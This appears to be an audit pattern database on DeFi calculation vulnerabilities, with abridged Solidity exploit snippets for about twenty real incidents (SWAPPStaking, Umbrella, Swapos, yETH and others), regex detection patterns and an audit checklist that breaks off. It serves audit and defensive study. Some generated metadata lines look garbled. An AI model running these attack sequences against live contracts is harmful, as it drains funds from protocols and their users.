---
# Core Classification (Required)
protocol: generic
chain: everychain
category: calculation
vulnerability_type: incorrect_calculation

# Attack Vector Details (Required)
attack_type: economic_exploit|reward_manipulation|dividend_gaming|arithmetic_abuse
affected_component: reward_calculation|staking_system|dividend_distribution|amm_pool|transfer_logic

# Technical Primitives (Required)
primitives:
  - reward_per_share
  - dividend_calculation
  - staking_balance
  - time_based_reward
  - pair_balance_dependency
  - k_value_check
  - integer_overflow
  - integer_underflow
  - unsafe_math
  - pool_donation
  - transfer_fee_logic
  - skim_function
  - sync_function
  - epoch_multiplier

# Impact Classification (Required)
severity: high
impact: fund_loss|reward_theft|dividend_siphoning|pool_draining
exploitability: 0.8
financial_impact: high

# Context Tags
tags:
  - defi
  - staking
  - dividends
  - reward
  - calculation
  - amm
  - arithmetic
  - overflow
  - underflow
  - transfer
  - real_exploit

# Version Info
language: solidity
version: all

# Source
source: DeFiHackLabs

# Pattern Identity (Required)
root_cause_family: arithmetic_error
pattern_key: arithmetic_error | reward_calculation | incorrect_calculation

# Interaction Scope (Required for multi-contract or multi-path issues)
interaction_scope: single_contract

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - _executeExploitSequence
  - _harvest
  - _transfer
  - _updateDividends
  - _withdraw
  - approve
  - balanceOf
  - block.timestamp
  - burn
  - buy
  - buyFor
  - calculateReward
  - claim
  - deposit
  - depositTo
  - dividend_calculation
  - dividendsOf
  - donate
  - donatePool
  - double
---

## References & Source Reports

> **For Agents**: Real-world exploits from DeFiHackLabs repository. Read the PoC files for detailed attack mechanics.

### Incorrect Calculation Exploits by Category

#### Reward/Staking Calculation Issues

| Date | Protocol | Vulnerability Type | Loss | PoC Path |
|------|----------|-------------------|------|----------|
| 2025-07-21 | SWAPPStaking | Incorrect Reward calculation | ~$96K | `DeFiHackLabs/src/test/2025-07/SWAPPStaking_exp.sol` |
| 2025-06-18 | Gangsterfinance | Incorrect dividends | 9 ETH (~$16.5K) | `DeFiHackLabs/src/test/2025-06/Gangsterfinance_exp.sol` |
| 2025-06-17 | BankrollStack | Incorrect dividends calculation | ~$17K | `DeFiHackLabs/src/test/2025-06/BankrollStack_exp.sol` |
| 2025-06-16 | BankrollNetwork | Incorrect dividends calculation | ~$50K | `DeFiHackLabs/src/test/2025-06/BankrollNetwork_exp.sol` |
| 2025-01-08 | LPMine | Incorrect reward calculation (time-based) | ~1.45 BNB | `DeFiHackLabs/src/test/2025-01/LPMine_exp.sol` |
| 2025-01-06 | SorStaking | Incorrect reward calculation | ~$10K | `DeFiHackLabs/src/test/2025-01/sorraStaking.sol` |
| 2024-10-25 | Bankroll_Network | Incorrect input validation (dividends) | ~$28K | `DeFiHackLabs/src/test/2024-09/Bankroll_exp.sol` |
| 2022-11-06 | VTF Token | Incorrect Reward calculation | ~$50K | `DeFiHackLabs/src/test/2022-10/VTF_exp.sol` |
| 2022-10-02 | RL Token | Incorrect Reward calculation (airdrop) | ~$80K | `DeFiHackLabs/src/test/2022-10/RL_exp.sol` |
| 2022-09-16 | DPC | Incorrect Reward calculation (stake/claim) | ~$103K | `DeFiHackLabs/src/test/2022-09/DPC_exp.sol` |

#### Arithmetic/Integer Issues (Overflow/Underflow)

| Date | Protocol | Vulnerability Type | Loss | PoC Path |
|------|----------|-------------------|------|----------|
| 2025-12-01 | yETH | Unsafe Math (complex pool manipulation) | ~$9M | `DeFiHackLabs/src/test/2025-12/yETH_exp.sol` |
| 2022-04-11 | Creat Future | Overflow | Unknown | - |
| 2022-03-03 | Umbrella Network | Underflow in withdraw | ~$700K | `DeFiHackLabs/src/test/2022-03/Umbrella_exp.sol` |
| 2024-05-30 | SCROLL | Integer Underflow | ~$10K | `DeFiHackLabs/src/test/2024-05/SCROLL_exp.sol` |
| 2024-07-10 | LW | Integer Underflow (transferFrom) | ~$236K | `DeFiHackLabs/src/test/2024-07/LW_exp.sol` |
| 2024-02-08 | Pandora | Integer Underflow | ~$10K | `DeFiHackLabs/src/test/2024-02/PANDORA_exp.sol` |
| 2022-08-06 | Qixi | Underflow (k-value bypass) | ~$5.4K | `DeFiHackLabs/src/test/2022-08/Qixi_exp.sol` |

#### K-Value / AMM Pool Calculation Issues

| Date | Protocol | Vulnerability Type | Loss | PoC Path |
|------|----------|-------------------|------|----------|
| 2023-11-13 | LinkDAO | Bad K Value Verification | ~$65K | `DeFiHackLabs/src/test/2023-11/LinkDao_exp.sol` |
| 2023-04-17 | Swapos V2 | Error K Value Attack | ~$468K | `DeFiHackLabs/src/test/2023-04/Swapos_exp.sol` |
| 2022-09-27 | RADT-DAO | Pair manipulate (sync bypass) | ~$32K | `DeFiHackLabs/src/test/2022-09/RADT_exp.sol` |
| 2022-09-19 | YYDS | Pair manipulate | ~$518K | `DeFiHackLabs/src/test/2022-09/Yyds_exp.sol` |

#### Transfer Logic / Fee Calculation Issues

| Date | Protocol | Vulnerability Type | Loss | PoC Path |
|------|----------|-------------------|------|----------|
| 2024-10-02 | FireToken | Pair Manipulation with Transfer | ~$3K | `DeFiHackLabs/src/test/2024-10/FireToken_exp.sol` |
| 2022-10-12 | HEALTH | Transfer Logic Flaw (burn in transfer) | ~$16K | `DeFiHackLabs/src/test/2022-10/HEALTH_exp.sol` |
| 2022-10-13 | PLTD | Transfer Logic Flaw (fee miscalc) | ~$27K | `DeFiHackLabs/src/test/2022-10/PLTD_exp.sol` |
| 2024-10-02 | AIZPTToken | Wrong Price Calculation | ~$20K | `DeFiHackLabs/src/test/2024-10/AIZPTToken_exp.sol` |

### External References
- [BlockSecTeam - VTF Analysis](https://twitter.com/BlockSecTeam/status/1585575129936977920)
- [CertiKAlert - RL Token](https://twitter.com/CertiKAlert/status/1576195971003858944)
- [BlockSecTeam - HEALTH Token](https://twitter.com/BlockSecTeam/status/1583073442433495040)
- [Phalcon - LinkDAO](https://x.com/phalcon_xyz/status/1725058908144746992)
- [CertiKAlert - Swapos](https://twitter.com/CertiKAlert/status/1647530789947469825)

---

# Incorrect Calculation & Reward Distribution Vulnerabilities - Comprehensive Database

**A Complete Pattern-Matching Guide for Calculation Security Audits**

---

## Table of Contents

1. [Overview](#overview)
2. [Vulnerability Categories](#vulnerability-categories)
3. [Category 1: Reward/Staking Calculation Errors](#category-1-rewardstaking-calculation-errors)
4. [Category 2: Dividend Distribution Issues](#category-2-dividend-distribution-issues)
5. [Category 3: Integer Overflow/Underflow](#category-3-integer-overflowunderflow)
6. [Category 4: AMM K-Value Manipulation](#category-4-amm-k-value-manipulation)
7. [Category 5: Transfer Logic Calculation Errors](#category-5-transfer-logic-calculation-errors)
8. [Category 6: Fee Calculation Bugs](#category-6-fee-calculation-bugs)
9. [Detection Patterns](#detection-patterns)
10. [Secure Implementation](#secure-implementation)
11. [Keywords for Search](#keywords-for-search)

---

## Overview

Incorrect calculation vulnerabilities occur when mathematical operations in smart contracts produce unexpected results due to flawed logic, improper state management, or arithmetic errors. These vulnerabilities have resulted in **$12M+ in losses** across DeFi protocols.

> **Root Cause Statement**: These vulnerabilities exist because reward/dividend calculations often depend on state variables that can be manipulated, time-based calculations can be gamed, and integer arithmetic can produce unexpected results without proper safeguards.

**Observed Frequency**: 25+ major exploits (2022-2025)
**Total Value Lost**: $12M+ USD
**Consensus Severity**: MEDIUM to HIGH
**Affected Protocols**: Staking platforms, dividend tokens, AMMs, reward pools, deflationary tokens

---



#### Agent Quick View

- Root cause statement: "This vulnerability exists because of arithmetic_error"
- Pattern key: `arithmetic_error | reward_calculation | incorrect_calculation`
- Interaction scope: `single_contract`
- Primary affected component(s): `reward_calculation|staking_system|dividend_distribution|amm_pool|transfer_logic`
- High-signal code keywords: `_executeExploitSequence`, `_harvest`, `_transfer`, `_updateDividends`, `_withdraw`, `approve`, `balanceOf`, `block.timestamp`
- Typical sink / impact: `fund_loss|reward_theft|dividend_siphoning|pool_draining`
- Validation strength: `moderate`

#### Contract / Boundary Map

- Entry surface(s): See pattern-specific attack scenarios below
- Contract hop(s): `199.function -> 3.function -> AIZPTExploit.function`
- Trust boundary crossed: `internal`
- Shared state or sync assumption: `state consistency across operations`

#### Valid Bug Signals

- Signal 1: Arithmetic operation on user-controlled input without overflow protection
- Signal 2: Casting between different-width integer types without bounds check
- Signal 3: Multiplication before division where intermediate product can exceed type max
- Signal 4: Accumulator variable can wrap around causing incorrect accounting

#### False Positive Guards

- Not this bug when: Solidity >= 0.8.0 with default checked arithmetic
- Safe if: SafeMath library used for all arithmetic on user-controlled values
- Requires attacker control of: specific conditions per pattern

## Vulnerability Categories

| Category | Description | Example Protocols | Typical Loss Range |
|----------|-------------|-------------------|-------------------|
| Reward/Staking Calculation | Reward calculation uses manipulable state | SWAPPStaking, LPMine, SorStaking | $10K - $103K |
| Dividend Distribution | Dividend per share can be gamed | BankrollNetwork, Gangsterfinance | $16K - $50K |
| Integer Overflow/Underflow | Arithmetic without SafeMath or bounds | Umbrella, Pandora, LW | $5K - $9M |
| K-Value Manipulation | AMM invariant check bypass | LinkDAO, Swapos, YYDS | $30K - $518K |
| Transfer Logic Flaws | Fees/burns calculated incorrectly | HEALTH, PLTD, FireToken | $3K - $27K |
| Fee Calculation Bugs | Incorrect fee math in transfers | Various deflationary tokens | Variable |

---

## Category 1: Reward/Staking Calculation Errors

### Root Cause

Reward calculations that depend on:
1. External balances (e.g., pair/pool balances) rather than tracked internal state
2. Time-based rewards without proper epoch/checkpoint management
3. Claimable rewards that don't properly decrement on withdrawal

### Vulnerable Pattern Examples

**Example 1: SWAPPStaking - Balance-Based Reward Calculation (2025-07, $96K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2025-07/SWAPPStaking_exp.sol`

```solidity
// ❌ VULNERABLE: Using staking contract's balance for deposit amount
contract SWAPPStakingExploit {
    function exploit() public {
        // Step 1: Initialize epochs to enable deposits
        init_epochs();
        
        // Step 2: Deposit the ENTIRE staking contract's balance
        // @audit The deposit function allows depositing tokens the contract already holds
        uint256 staking_cusdc_balance = cUsdc.balanceOf(address(staking));
        staking.deposit(address(cUsdc), staking_cusdc_balance, address(0x0));
        
        // Step 3: Emergency withdraw - attacker gets ALL the staked tokens
        staking.emergencyWithdraw(address(cUsdc));
        
        // Result: Attacker deposits nothing, withdraws everything
    }
}
```

**Attack Mechanism:**
1. Contract tracks deposits using external `balanceOf()` instead of internal accounting
2. Attacker can "deposit" tokens already in the contract
3. Emergency withdraw returns all deposited amount to attacker

**Example 2: LPMine - Time-Based Reward with Improper Reset (2025-01, 1.45 BNB)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2025-01/LPMine_exp.sol`

```solidity
// ❌ VULNERABLE: Reward calculation uses pair balance, time not properly updated
interface ILPMine {
    function partakeAddLp(uint256 _tokenId, uint256 _tokenAmount, uint256 _usdtAmount, address _oldUser) external;
    function extractReward(uint256 _tokenId) external;
}

contract LPMineExploit {
    function exploit() external {
        // Step 1: Flash loan to inflate pair balance
        (bool success,) = v3pool.call(abi.encodeWithSignature("flash(...)", borrow_2, 0, ""));
        
        // In flash callback:
        // Step 2: Transfer large amount to pair to inflate balance
        USDT.transfer(address(pair), USDT.balanceOf(address(this)));
        
        // Step 3: Claim reward multiple times
        // @audit Time not properly updated, allowing repeated claims
        for(uint i = 0; i < 2000; i++) {
            try LPMine.extractReward(1) {
                // Each claim calculates reward based on inflated pair balance
            } catch {
                continue;
            }
        }
        
        // Step 4: Recover tokens via skim
        pair.skim(address(this));
    }
}
```

**Example 3: SorStaking - Repeated Withdrawal for Rewards (2025-01, $10K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2025-01/sorraStaking.sol`

```solidity
// ❌ VULNERABLE: Withdraw doesn't properly clear reward entitlement
contract SorStakingExploit {
    function exploit() external {
        // Step 1: Deposit tokens
        bytes memory depositData = abi.encodeWithSignature(
            "deposit(uint256,uint8)",
            122868871710593438486048,  // Full token amount
            0  // tier
        );
        sorStaking.call(depositData);
        
        // Step 2: Advance time
        cheats.warp(block.timestamp + 14 days + 1);
        
        // Step 3: Withdraw tiny amount repeatedly to claim rewards
        // @audit Each withdraw of 1 token still gives full reward calculation
        for(uint i = 0; i < 800; i++) {
            bytes memory withdrawData = abi.encodeWithSignature("withdraw(uint256)", 1);
            sorStaking.call(withdrawData);
        }
    }
}
```

**Example 4: VTF Token - updateUserBalance Abuse (2022-10, $50K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2022-10/VTF_exp.sol`

```solidity
// ❌ VULNERABLE: updateUserBalance can be called repeatedly to accumulate rewards
contract claimReward {
    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    
    constructor() {
        // @audit First call in constructor sets initial state
        VTF.updateUserBalance(address(this));
    }
    
    function claim(address receiver) external {
        // @audit Second call gives rewards without time check
        VTF.updateUserBalance(address(this));
        VTF.transfer(receiver, VTF.balanceOf(address(this)));
    }
}

contract VTFExploit {
    function exploit() public {
        // Deploy 400 contracts, each claims rewards
        for (uint256 _salt = 0; _salt < 400; _salt++) {
            address _add;
            bytes memory bytecode = type(claimReward).creationCode;
            assembly {
                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
            }
            contractList.push(_add);
        }
        
        // Pass tokens through chain to accumulate rewards
        VTF.transfer(contractList[0], VTF.balanceOf(address(this)));
        for (uint256 i = 0; i < contractList.length - 1; ++i) {
            contractList[i].call(abi.encodeWithSignature("claim(address)", contractList[i + 1]));
        }
    }
}
```

---

## Category 2: Dividend Distribution Issues

### Root Cause

Dividend/profit-sharing mechanisms that can be gamed through:
1. Donation attacks that inflate dividend-per-share
2. Immediate claim after large donations
3. Dividend calculation based on manipulable pool state

### Vulnerable Pattern Examples

**Example 1: BankrollNetwork - donatePool + Buy Attack (2025-06, $50K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2025-06/BankrollNetwork_exp.sol`

```solidity
// ❌ VULNERABLE: Donation inflates dividend per share immediately
interface IBankrollNetworkStack {
    function donatePool(uint256 tokenAmount) external;     
    function buy(uint256 tokenAmount) external returns (uint256);
    function sell(uint256 tokenAmount) external;
    function myDividends() external view returns (uint256);
    function withdraw() external;
}

contract BankrollNetworkExploit {
    function exploit() external {
        // Step 1: Flash loan large amount
        borrow_amount = 2_000 ether;
        pair.swap(0, borrow_amount, address(this), "0x3030");
    }
    
    function pancakeCall(...) external {
        WBNB.approve(address(bankRollNetwork), type(uint256).max);
        
        // Step 2: Donate to pool - this increases dividend per share
        // @audit Donation immediately affects dividend calculation
        bankRollNetwork.donatePool(1000 ether);
        
        // Step 3: Buy tokens - now entitled to inflated dividends
        bankRollNetwork.buy(240 ether);
        
        // Step 4: Sell tokens
        bankRollNetwork.sell(bankRollNetwork.myTokens());
        
        // Step 5: Top up to cover shortfall and withdraw dividends
        uint256 topUp = 94064984776383565540;
        WBNB.transfer(address(bankRollNetwork), topUp);
        bankRollNetwork.withdraw();
        
        // Profit: dividends from donated pool funds
    }
}
```

**Example 2: Gangsterfinance - Donate + Resolve Gaming (2025-06, 9 ETH)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2025-06/Gangsterfinance_exp.sol`

```solidity
// ❌ VULNERABLE: donate() followed by immediate harvest
interface ITokenVault {
    function donate(uint256 _amount) external;
    function depositTo(address _user, uint256 _amount) external;
    function resolve(uint256 _amount) external;
    function harvest() external;
}

contract GangsterfinanceExploit {
    function pancakeCall(...) external {
        uint256 donateAmount = 1000000000000000000;    // 1 BTCB
        uint256 depositAmount = 15720000000000000;     // 0.01572 BTCB
        
        IERC20(BTCB).approve(address(TOKEN_VAULT), borrowAmount);
        
        // Step 1: Donate large amount - inflates dividend per share
        ITokenVault(TOKEN_VAULT).donate(donateAmount);
        
        // Step 2: Small deposit - now entitled to share of donations
        ITokenVault(TOKEN_VAULT).depositTo(address(this), depositAmount);
        
        // Step 3: Resolve position
        ITokenVault(TOKEN_VAULT).resolve(ITokenVault(TOKEN_VAULT).myTokens());
        
        // Step 4: Harvest - claim inflated dividends
        // @audit Harvest gives dividends from entire donated pool
        ITokenVault(TOKEN_VAULT).harvest();
    }
}
```

**Example 3: Bankroll_Network V2 - buyFor Attack (2024-09, $28K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2024-09/Bankroll_exp.sol`

```solidity
// ❌ VULNERABLE: buyFor allows buying for the contract itself
interface IBankrollNetworkStack {
    function buyFor(address _customerAddress, uint256 buy_amount) external returns (uint256);
    function dividendsOf(address _customerAddress) external view returns (uint256);
}

contract BankrollExploit {
    function exploit() external {
        // Step 1: Initial buy for self
        bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));
        
        uint256 bal_bank_roll = WBNB.balanceOf(address(bankRoll));
        
        // Step 2: Repeatedly buy for the CONTRACT itself
        // @audit This inflates dividend calculation without creating new shares
        for (uint256 i = 0; i < 2810; i++) {
            bankRoll.buyFor(address(bankRoll), bal_bank_roll);
        }
        
        // After: dividendsOf(attacker) is massively inflated
        // Step 3: Sell and withdraw
        bankRoll.sell(bankRoll.myTokens());
        bankRoll.withdraw();
    }
}
```

---

## Category 3: Integer Overflow/Underflow

### Root Cause

Arithmetic operations without proper bounds checking:
1. Pre-Solidity 0.8.0 contracts without SafeMath
2. Unchecked blocks in Solidity 0.8.0+
3. Subtraction before checking balance

### Vulnerable Pattern Examples

**Example 1: Umbrella Network - Withdraw Underflow (2022-03, $700K)** [CRITICAL]

> Reference: `DeFiHackLabs/src/test/2022-03/Umbrella_exp.sol`

```solidity
// ❌ VULNERABLE: No SafeMath, balance subtraction underflows
// StakingRewards contract vulnerable code:
function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
    require(amount != 0, "Cannot withdraw 0");
    
    // @audit Not using safe math - underflow possible
    _totalSupply = _totalSupply - amount;
    _balances[user] = _balances[user] - amount;  // UNDERFLOW if amount > _balances[user]
    
    // ... transfer logic
}

// Exploit
contract UmbrellaExploit {
    function exploit() public {
        // Withdraw amount larger than balance - causes underflow
        // Result: _balances[attacker] becomes MAX_UINT256
        StakingRewards.withdraw(8_792_873_290_680_252_648_282);
        // Now attacker can withdraw entire pool
    }
}
```

**Example 2: LW Token - Unauthorized transferFrom (2024-07, $236K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2024-07/LW_exp.sol`

```solidity
// ❌ VULNERABLE: transferFrom allows stealing from token contract itself
contract LWExploit {
    function exploit() public {
        // @audit transferFrom(Lw, this, amount) - stealing from token contract
        // The token contract has a flaw allowing transfers FROM the token address
        Lw.transferFrom(address(Lw), address(this), 1_000_000_000_000_000_000_000_000_000_000_000);
        
        // Now swap stolen tokens for profit
        while (i < 9999) {
            swap_token_to_token(address(Lw), address(BUSDT), 800_000_000 ether);
            i++;
        }
    }
}
```

**Example 3: Pandora - transferFrom Balance Manipulation (2024-02, $10K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2024-02/PANDORA_exp.sol`

```solidity
// ❌ VULNERABLE: transferFrom doesn't return bool, allows balance manipulation
interface NoReturnTransferFrom {
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract PandoraExploit {
    function exploit() external {
        uint256 pandora_balance = PANDORA.balanceOf(address(V2_PAIR));
        
        // Step 1: Transfer from pair to token contract
        PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance - 1);
        
        // Step 2: Sync to update reserves to near-zero
        V2_PAIR.sync();
        
        // Step 3: Transfer back - but reserves are now skewed
        PANDORA.transferFrom(address(PANDORA), address(V2_PAIR), pandora_balance - 1);
        
        // Step 4: Swap at manipulated rate
        V2_PAIR.swap(swapAmount, 0, address(this), "");
    }
}
```

**Example 4: yETH - Complex Unsafe Math (2025-12, $9M)** [CRITICAL]

> Reference: `DeFiHackLabs/src/test/2025-12/yETH_exp.sol`

```solidity
// ❌ VULNERABLE: Complex pool math manipulation
contract YETHExploit {
    function _executeExploitSequence() internal {
        // Phase 1: Initial manipulation with specific amounts
        _executePhase1();
        
        // Phase 2: Multiple add/remove cycles exploit precision issues
        _executeAddRemoveCycle(1, _getPhase2Amounts(), 2_789_348_310_901_989_968_648);
        _executeAddRemoveCycle(2, _getPhase3Amounts(), 7_379_203_011_929_903_830_039);
        // ... more cycles
        
        // Phase 3: Rebase exploitation
        OETH.rebase();  // @audit Rate update enables further manipulation
        
        // Phase 4: Final drain
        uint256 poolSupply = POOL.supply();
        // @audit Can remove entire supply due to accumulated calculation errors
        _removeLiquidity(poolSupply, "After FINAL DRAIN");
    }
}
```

---

## Category 4: AMM K-Value Manipulation

### Root Cause

AMM pools that don't properly validate the constant product invariant (k = x * y):
1. Weak k-value checks that can be bypassed
2. Sync operations that update reserves without validating invariant
3. Custom swap implementations with flawed math

### Vulnerable Pattern Examples

**Example 1: LinkDAO - Bad K Value Verification (2023-11, $65K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2023-11/LinkDao_exp.sol`

```solidity
// ❌ VULNERABLE: K-value check can be bypassed
contract LinkDaoExploit {
    function exploit() public {
        // @audit swap() with callback allows k-value manipulation
        x6524.swap(29_663_356_140_000_000_000_000, 0, r, hex"313233");
    }
    
    // Fallback triggered during swap
    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xdc6eaaa9) {
            // @audit Send minimal tokens during swap callback
            // This bypasses k-value check due to calculation flaw
            x55d3.transfer(address(x6524), 1_000_000_000_000_000_000);
        }
    }
}
```

**Example 2: Swapos V2 - Error K Value Attack (2023-04, $468K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2023-04/Swapos_exp.sol`

```solidity
// ❌ VULNERABLE: K-value check has arithmetic flaw
contract SwaposExploit {
    function exploit() external {
        WETH.deposit{value: 3 ether}();
        
        // @audit Transfer tiny amount to trigger flawed swap
        WETH.transfer(address(swapPos), 10);  // Only 10 wei!
        
        // @audit Get massive output with minimal input due to k-value error
        swapPos.swap(142_658_161_144_708_222_114_663, 0, address(this), "");
        
        // Result: Got 142K tokens for 10 wei
    }
}
```

**Example 3: RADT-DAO - Pair Sync Manipulation (2022-09, $32K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2022-09/RADT_exp.sol`

```solidity
// ❌ VULNERABLE: Sync updates reserves to manipulated state
interface IWRAP {
    function withdraw(address from, address to, uint256 amount) external;
}

contract RADTExploit {
    function exploit() external {
        buyRADT();
        
        // Step 1: Transfer 1 wei to trigger state change
        USDT.transfer(address(pair), 1);
        
        // Step 2: Withdraw from wrap to pair - inflates RADT in pair
        uint256 amount = RADT.balanceOf(address(pair)) * 100 / 9;
        wrap.withdraw(address(0x68Db...), address(pair), amount);
        
        // Step 3: Sync - reserves now reflect inflated balance
        // @audit Sync doesn't validate k-value properly
        pair.sync();
        
        // Step 4: Sell at manipulated rate
        sellRADT();
    }
}
```

**Example 4: YYDS - Pair Manipulate (2022-09, $518K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2022-09/Yyds_exp.sol`

```solidity
// ❌ VULNERABLE: Claimable rewards use pair balance for calculation
contract YYDSExploit {
    function exploit() public {
        // Flash loan to drain USDT from pair
        uint256 amount0Out = USDT.balanceOf(address(Pair));
        Pair.swap(amount0Out - 1 * 1e18, 0, address(this), new bytes(1));
    }
    
    function pancakeCall(...) public {
        // Claim rewards while pair is drained
        targetClaim.claim(address(this));
        try targetWihtdraw.withdrawReturnAmountByReferral() {} catch {}
        try targetWihtdraw.withdrawReturnAmountByMerchant() {} catch {}
        try targetWihtdraw.withdrawReturnAmountByConsumer() {} catch {}
        
        // @audit YYDS now in attacker hands
        // Transfer YYDS to pair and repay loan
        YYDS.transfer(address(Pair), yydsInContract);
        USDT.transfer(address(Pair), amountUsdt);
    }
}
```

---

## Category 5: Transfer Logic Calculation Errors

### Root Cause

Deflationary tokens with transfer fees/burns that have flawed calculations:
1. Burns during transfer that affect pair balances incorrectly
2. Fee calculations that can be exploited with specific amounts
3. Transfer to self triggering unintended side effects

### Vulnerable Pattern Examples

**Example 1: HEALTH Token - Transfer Burns from Pair (2022-10, $16K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2022-10/HEALTH_exp.sol`

```solidity
// ❌ VULNERABLE: Transfer to self causes burns from pair
contract HEALTHExploit {
    function exploit() external {
        // Swap WBNB to HEALTH
        _WBNBToHEALTH();
        
        // @audit Transfer to self 1000 times
        // Each transfer triggers burn logic that affects pair reserves
        for (uint256 i = 0; i < 1000; i++) {
            HEALTH_TOKEN.transfer(address(this), 0);  // Transfer 0 amount!
        }
        
        // Price has increased due to burns from pair
        // Swap HEALTH back to WBNB at better rate
        _HEALTHToWBNB();
    }
}
```

**Example 2: PLTD Token - Skim Abuse (2022-10, $27K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2022-10/PLTD_exp.sol`

```solidity
// ❌ VULNERABLE: Transfer inflates pair balance, skim drains excess
contract PLTDExploit {
    function exploit() external {
        USDTToPLTD();
        
        uint256 amount = PLTD.balanceOf(address(Pair));
        
        // @audit Transfer 2x pair balance - but fee math is wrong
        PLTD.transfer(address(Pair), amount * 2 - 1);
        
        // Skim excess tokens that shouldn't exist
        Pair.skim(address(this));
        
        // Transfer to origin to avoid issues
        PLTD.transfer(tx.origin, 1e18);
        
        PLTDToUSDT();
    }
}
```

**Example 3: FireToken - Pair Balance Duplication (2024-10, $3K)** [LOW]

> Reference: `DeFiHackLabs/src/test/2024-10/FireToken_exp.sol`

```solidity
// ❌ VULNERABLE: Transfer can duplicate balance when sent to pair
contract FireTokenExploit {
    constructor() public payable {
        // Buy FIRE tokens
        IFS(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20 ether, 0, path, address(this), block.timestamp
        );
        
        uint256 pairBal = IFS(FIRE).balanceOf(UniPairWETHFIRE);
        
        // @audit Transfer same amount as pair balance - causes doubling
        IERC20(FIRE).transfer(UniPairWETHFIRE, pairBal);
        
        // Now pair has 2x balance but reserves unchanged
        uint256 pairBal2 = IFS(FIRE).balanceOf(UniPairWETHFIRE);  // 2x original
        
        // Swap at manipulated rate
        uint256 amountOut = IFS(UniswapV2Router02).getAmountOut(pairBal2 - r0, r0, r1);
        IFS(UniPairWETHFIRE).swap(0, amountOut, address(this), "");
    }
}
```

---

## Category 6: Fee Calculation Bugs

### Root Cause

Incorrect fee calculations in:
1. Swap fee math that rounds incorrectly
2. Tax tokens with flawed percentage calculations
3. Rebasing tokens where fee applies before/after rebase incorrectly

### Vulnerable Pattern Examples

**Example 1: AIZPTToken - Self-Transfer Fee Loop (2024-10, $20K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2024-10/AIZPTToken_exp.sol`

```solidity
// ❌ VULNERABLE: Transfer to token contract triggers fee redistribution
contract AIZPTExploit {
    function exploit() external {
        IFS(weth).withdraw(8000 ether);
        
        // Buy AIZPT with ETH
        AIZPT.call{value: 8000 ether}("");
        
        // @audit Transfer to token contract 199 times
        // Each transfer redistributes fees, inflating attacker's balance
        for (uint256 i; i < 199; ++i) {
            IERC20(AIZPT).transfer(AIZPT, 3_837_275 ether);
        }
        
        // Convert back to ETH at profit
        IFS(weth).deposit{value: address(this).balance}();
    }
}
```

**Example 2: DPC - Stake/Claim Fee Bypass (2022-09, $103K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2022-09/DPC_exp.sol`

```solidity
// ❌ VULNERABLE: Airdrop + stake allows claiming rewards multiple times
contract DPCExploit {
    function exploit() external {
        // Step 1: Get airdrop
        DPC.tokenAirdrop(address(this), address(DPC), 100);
        
        // Step 2: Add liquidity
        addDPCLiquidity();
        
        // Step 3: Stake LP tokens
        DPC.stakeLp(address(this), address(DPC), Pair.balanceOf(address(this)));
        
        // Step 4: Advance time
        cheats.warp(block.timestamp + 24 * 60 * 60);
        
        // Step 5: Claim stake rewards multiple times
        // @audit claimStakeLp doesn't properly track claimed amounts
        for (uint256 i = 0; i < 9; i++) {
            DPC.claimStakeLp(address(this), 1);
        }
        
        // Step 6: Also claim airdrop
        DPC.claimDpcAirdrop(address(this));
    }
}
```

---

## Detection Patterns

### Code Patterns to Search For

```yaml
# Dangerous Patterns (VULNERABLE)
anti_patterns:
  # Reward Calculation Issues
  - pattern: "balanceOf.*pair|pool.*reward"
    risk: "Reward based on manipulable external balance"
    
  - pattern: "updateUserBalance|distributeAirdrop.*constructor"
    risk: "Reward function callable in constructor to game rewards"
    
  - pattern: "withdraw.*!.*SafeMath|unchecked.*-"
    risk: "Underflow in withdrawal"
    
  # Dividend Issues
  - pattern: "donatePool|donate.*dividends"
    risk: "Donation can inflate dividend per share"
    
  - pattern: "buyFor.*address\\(this\\)|address\\(contract\\)"
    risk: "Buy for contract itself inflates dividends"
    
  # K-Value Issues
  - pattern: "swap.*callback.*transfer"
    risk: "Callback during swap may bypass k-value check"
    
  - pattern: "sync\\(\\).*balance"
    risk: "Sync after balance manipulation"
    
  # Transfer Logic
  - pattern: "transfer.*address\\(this\\).*0|transfer.*self"
    risk: "Self-transfer may trigger unintended effects"
    
  - pattern: "skim\\(\\).*transfer"
    risk: "Skim abuse after balance inflation"

# Safe Patterns (SECURE)
safe_patterns:
  - "SafeMath|checked arithmetic"
  - "_trackedBalance|internalBalance"
  - "lastClaimTime.*block.timestamp"
  - "rewardDebt|rewardCredited"
  - "require.*k.*>=|k.*invariant"
```

### Audit Checklist

**Reward/Staking:**
- [ ] Does reward calculation use internal tracking vs external balanceOf?
- [ ] Is there proper time-based checkpointing for rewards?
- [ ] Can rewards be claimed multiple times for same stake period?
- [ ] Is deposit amount validated against actual transfer received?

**Dividends:**
- [ ] Can donation immediately affect dividend per share?
- [ ] Is there protection against donate+claim in same transaction?
- [ ] Can buyFor/depositFor be called with contract as recipient?

**Arithmetic:**
- [ ] Using SafeMath or Solidity 0.8.0+ checked arithmetic?
- [ ] Any unchecked blocks in critical calculations?
- [ ] Subtraction before balance check?

**K-Value:**
